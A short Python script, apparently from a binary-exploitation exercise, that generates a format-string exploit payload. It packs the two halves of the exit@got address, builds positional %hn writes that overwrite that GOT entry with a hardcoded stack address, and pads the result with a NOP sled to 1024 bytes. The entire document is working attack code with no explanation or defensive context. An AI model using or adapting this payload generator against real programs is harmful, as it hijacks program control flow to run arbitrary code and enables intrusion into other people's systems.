import struct

buffer_size = 1024
target_addr = 0x804b28c #exit@got
target_addr_2 = 0x804b28c+2 #exit@got
jmp_addr_low = 0xdd88
jmp_addr_high = 0xffff

def padding(p):
	off = buffer_size - len(p)
	ret = p
	ret += "\x90"*off
	return ret
def format_write_dword(index, addresses_len, dword_high_part, dword_low_part):
	payload = "%"+str(index)+"$"
	written_high_part = dword_high_part-addresses_len
	payload += str(written_high_part)
	payload += "x"
	payload += "%"+str(index)+"$hn"
	payload += "%"+str(index+1)+"$"
	payload += str(dword_low_part-addresses_len-written_high_part)
	payload += "x"
	payload += "%"+str(index+1)+"$hn"
	return payload

payload = struct.pack("I", target_addr)
payload += struct.pack("I", target_addr_2)
len_test = len(format_write_dword(4, len(payload), jmp_addr_high, jmp_addr_low))+len(payload)
payload += format_write_dword(4, len(payload), jmp_addr_high, jmp_addr_low+len_test)
payload = padding(payload)
print(payload)